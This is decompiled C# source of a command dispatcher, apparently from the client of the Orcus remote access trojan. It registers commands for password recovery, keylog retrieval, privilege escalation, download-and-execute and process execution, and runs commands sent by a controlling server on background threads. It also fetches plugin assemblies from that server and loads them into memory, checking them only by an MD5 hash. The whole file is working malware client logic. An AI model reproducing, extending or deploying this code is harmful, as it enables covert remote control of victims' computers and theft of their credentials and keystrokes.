using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Connection.Args;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands;
using Orcus.StaticCommands;
using Orcus.StaticCommands.Client;
using Orcus.StaticCommands.Computer;
using Orcus.StaticCommands.Interaction;
using Orcus.StaticCommands.System;

namespace Orcus.StaticCommandManagement;

public class StaticCommandSelector
{
	private readonly List<LoadedStaticCommandPluginInfo> _loadedPlugins;

	private readonly StaticCommandScheduler _staticCommandScheduler;

	private readonly IClientInfo _clientInfo;

	private readonly object _activeCommandsLock = new object();

	private readonly DynamicCommandStore _dynamicCommandStore;

	private readonly ActiveCommandStopScheduler _activeCommandStopScheduler;

	public Dictionary<Guid, StaticCommand> StaticCommands { get; }

	public static StaticCommandSelector Current { get; private set; }

	public Dictionary<PotentialCommand, ActiveStaticCommand> ActiveCommands { get; }

	private StaticCommandSelector(IClientInfo clientInfo)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Expected O, but got Unknown
		StaticCommands = new Dictionary<Guid, StaticCommand>(((IEnumerable<StaticCommand>)(object)new StaticCommand[18]
		{
			(StaticCommand)new KillCommand(),
			(StaticCommand)new MakeAdminCommand(),
			(StaticCommand)new PasswordRecoveryCommandEx(),
			(StaticCommand)new RequestKeyLogCommandEx(),
			(StaticCommand)new UninstallCommandEx(),
			(StaticCommand)new UpdateCommandEx(),
			(StaticCommand)new UpdateFromUrlCommandEx(),
			(StaticCommand)new ChangeComputerStateCommand(),
			(StaticCommand)new ChangeWallpaperCommandEx(),
			(StaticCommand)new DownloadAndExecuteCommand(),
			(StaticCommand)new DownloadAndExecuteFromUrlCommand(),
			(StaticCommand)new OpenWebsiteCommand(),
			(StaticCommand)new ExecuteProcessCommand(),
			(StaticCommand)new WakeOnLanCommand(),
			(StaticCommand)new ShowMessageBoxCommand(),
			(StaticCommand)new ShowBalloonTooltipCommand(),
			(StaticCommand)new OpenTextInNotepadCommand(),
			(StaticCommand)new SystemLockCommandEx()
		}).ToDictionary((StaticCommand x) => x.get_CommandId(), (StaticCommand y) => y));
		_staticCommandScheduler = new StaticCommandScheduler();
		_loadedPlugins = new List<LoadedStaticCommandPluginInfo>();
		_clientInfo = clientInfo;
		ActiveCommands = new Dictionary<PotentialCommand, ActiveStaticCommand>();
		_dynamicCommandStore = new DynamicCommandStore();
		_activeCommandStopScheduler = new ActiveCommandStopScheduler();
	}

	public static void Initialize(IClientInfo clientInfo)
	{
		Current = new StaticCommandSelector(clientInfo);
		Current.Initialize();
	}

	private void Initialize()
	{
		_dynamicCommandStore.Initialize();
		_activeCommandStopScheduler.Initialize(_dynamicCommandStore);
		_staticCommandScheduler.Initialize(ExecutePotentialCommand, _dynamicCommandStore);
	}

	public List<int> GetActiveCommandIds()
	{
		lock (_activeCommandsLock)
		{
			return ActiveCommands.Select((KeyValuePair<PotentialCommand, ActiveStaticCommand> x) => x.Key.get_CallbackId()).ToList();
		}
	}

	public void StopActiveCommand(int commandId)
	{
		lock (_activeCommandsLock)
		{
			List<KeyValuePair<PotentialCommand, ActiveStaticCommand>> source = ActiveCommands.Where((KeyValuePair<PotentialCommand, ActiveStaticCommand> x) => x.Key.get_CallbackId() == commandId).ToList();
			if (source.Any())
			{
				KeyValuePair<PotentialCommand, ActiveStaticCommand> keyValuePair = source.FirstOrDefault();
				keyValuePair.Value.StopExecute();
				_dynamicCommandStore.RemoveStoredCommand(keyValuePair.Key);
				_activeCommandStopScheduler.CommandManualStop(keyValuePair.Key);
			}
		}
	}

	public void ExecuteCommand(PotentialCommand potentialCommand)
	{
		if (!StaticCommands.ContainsKey(potentialCommand.get_CommandId()) && !LoadStaticCommandPlugin(potentialCommand.get_PluginResourceId(), potentialCommand.get_PluginHash()))
		{
			return;
		}
		lock (_activeCommandsLock)
		{
			if (ActiveCommands.Any((KeyValuePair<PotentialCommand, ActiveStaticCommand> x) => x.Key.get_CallbackId() == potentialCommand.get_CallbackId()))
			{
				return;
			}
		}
		ExecutionEvent executionEvent = potentialCommand.get_ExecutionEvent();
		if (executionEvent != null && executionEvent.get_Id() != 0)
		{
			_staticCommandScheduler.AddPotentialCommand(potentialCommand);
		}
		else
		{
			ExecutePotentialCommand(potentialCommand);
		}
	}

	public void ExecuteCommand(Guid guid, byte[] parameter, IFeedbackFactory feedbackFactory)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		if (StaticCommands.TryGetValue(guid, out var value))
		{
			value.Execute(new CommandParameter(parameter), feedbackFactory, _clientInfo);
		}
	}

	private void ExecutePotentialCommand(PotentialCommand potentialCommand)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		if (!StaticCommands.TryGetValue(potentialCommand.get_CommandId(), out var staticCommand))
		{
			return;
		}
		ActiveStaticCommand activeStaticCommand = default(ActiveStaticCommand);
		ref ActiveStaticCommand reference = ref activeStaticCommand;
		StaticCommand obj = staticCommand;
		reference = (ActiveStaticCommand)(object)((obj is ActiveStaticCommand) ? obj : null);
		if (activeStaticCommand != null)
		{
			activeStaticCommand = (ActiveStaticCommand)Activator.CreateInstance(((object)activeStaticCommand).GetType());
			activeStaticCommand.add_ExecutionStopped((EventHandler)ActiveStaticCommandOnExecutionStopped);
			if (!_activeCommandStopScheduler.ExecuteActiveCommand(potentialCommand, activeStaticCommand))
			{
				return;
			}
			lock (_activeCommandsLock)
			{
				ActiveCommands.Add(potentialCommand, activeStaticCommand);
			}
			ServerConnection serverConnection = (ServerConnection)(object)_clientInfo.get_ServerConnection();
			lock (serverConnection.SendLock)
			{
				DynamicCommandFeedbackFactory.PushEvent(serverConnection.BinaryWriter, potentialCommand.get_CallbackId(), (ActivityType)3, null);
			}
			Thread thread = new Thread((ThreadStart)delegate
			{
				//IL_0016: Unknown result type (might be due to invalid IL or missing references)
				//IL_0031: Expected O, but got Unknown
				try
				{
					((StaticCommand)activeStaticCommand).Execute(new CommandParameter(potentialCommand.get_Parameter()), (IFeedbackFactory)null, _clientInfo);
				}
				catch (Exception)
				{
					ActiveStaticCommandOnExecutionStopped(activeStaticCommand, EventArgs.Empty);
				}
			});
			thread.IsBackground = true;
			thread.Start();
			return;
		}
		DynamicCommandFeedbackFactory feedbackFactory = new DynamicCommandFeedbackFactory((ServerConnection)(object)_clientInfo.get_ServerConnection(), potentialCommand.get_CallbackId());
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_004a: Expected O, but got Unknown
			try
			{
				staticCommand.Execute(new CommandParameter(potentialCommand.get_Parameter()), (IFeedbackFactory)(object)feedbackFactory, _clientInfo);
			}
			catch (Exception ex)
			{
				feedbackFactory.Failed("Critical error: " + ex.Message);
			}
			feedbackFactory.Succeeded();
		});
		thread2.IsBackground = true;
		thread2.Start();
	}

	private void ActiveStaticCommandOnExecutionStopped(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		ActiveStaticCommand activeStaticCommand = (ActiveStaticCommand)sender;
		PotentialCommand key;
		lock (_activeCommandsLock)
		{
			key = ActiveCommands.FirstOrDefault((KeyValuePair<PotentialCommand, ActiveStaticCommand> x) => ((StaticCommand)x.Value).get_CommandId() == ((StaticCommand)activeStaticCommand).get_CommandId())!.Key;
			if (key == null)
			{
				return;
			}
			ActiveCommands.Remove(key);
		}
		ServerConnection serverConnection = (ServerConnection)(object)_clientInfo.get_ServerConnection();
		lock (serverConnection.SendLock)
		{
			DynamicCommandFeedbackFactory.PushEvent(serverConnection.BinaryWriter, key.get_CallbackId(), (ActivityType)4, null);
		}
	}

	public bool CheckPluginAvailable(byte[] pluginHash)
	{
		if (_loadedPlugins.Any((LoadedStaticCommandPluginInfo x) => x.Hash.SequenceEqual(pluginHash)))
		{
			return true;
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(Consts.StaticCommandPluginsDirectory);
		if (directoryInfo.Exists)
		{
			FileInfo[] files = directoryInfo.GetFiles("*");
			foreach (FileInfo fileInfo in files)
			{
				if (_loadedPlugins.Any((LoadedStaticCommandPluginInfo x) => x.Filename == fileInfo.FullName))
				{
					continue;
				}
				byte[] first;
				using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
				{
					using FileStream inputStream = fileInfo.OpenRead();
					first = mD5CryptoServiceProvider.ComputeHash(inputStream);
				}
				if (first.SequenceEqual(pluginHash))
				{
					InitializePlugin(fileInfo.FullName, pluginHash);
					return true;
				}
			}
		}
		return false;
	}

	public bool LoadStaticCommandPlugin(int resourceId, byte[] pluginHash)
	{
		if (resourceId < -1)
		{
			return true;
		}
		if (CheckPluginAvailable(pluginHash))
		{
			return true;
		}
		ServerConnection serverConnection = (ServerConnection)(object)_clientInfo.get_ServerConnection();
		AutoResetEvent autoResetEvent = new AutoResetEvent(initialState: false);
		string pluginFilename = null;
		EventHandler<StaticCommandPluginReceivedEventArgs> value = delegate(object sender, StaticCommandPluginReceivedEventArgs e)
		{
			if (e.PluginResourceId == resourceId)
			{
				pluginFilename = e.Filename;
				autoResetEvent.Set();
			}
		};
		serverConnection.StaticCommandPluginReceived += value;
		try
		{
			lock (serverConnection.SendLock)
			{
				serverConnection.BinaryWriter.Write((byte)30);
				serverConnection.BinaryWriter.Write(4);
				serverConnection.BinaryWriter.Write(resourceId);
			}
			if (!autoResetEvent.WaitOne(300000))
			{
				return false;
			}
		}
		finally
		{
			serverConnection.StaticCommandPluginReceived -= value;
			autoResetEvent.Close();
		}
		byte[] first;
		using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
		{
			using FileStream inputStream = File.OpenRead(pluginFilename);
			first = mD5CryptoServiceProvider.ComputeHash(inputStream);
		}
		if (first.SequenceEqual(pluginHash))
		{
			InitializePlugin(pluginFilename, pluginHash);
			return true;
		}
		return false;
	}

	private void InitializePlugin(string filename, byte[] hash)
	{
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		Assembly assembly = Assembly.Load(File.ReadAllBytes(filename));
		_loadedPlugins.Add(new LoadedStaticCommandPluginInfo(filename, hash));
		foreach (Type item in from x in assembly.GetTypes()
			where x.IsSubclassOf(typeof(StaticCommand)) && (object)x.GetConstructor(Type.EmptyTypes) != null
			select x)
		{
			StaticCommand val = (StaticCommand)Activator.CreateInstance(item);
			StaticCommands.Add(val.get_CommandId(), val);
		}
	}
}
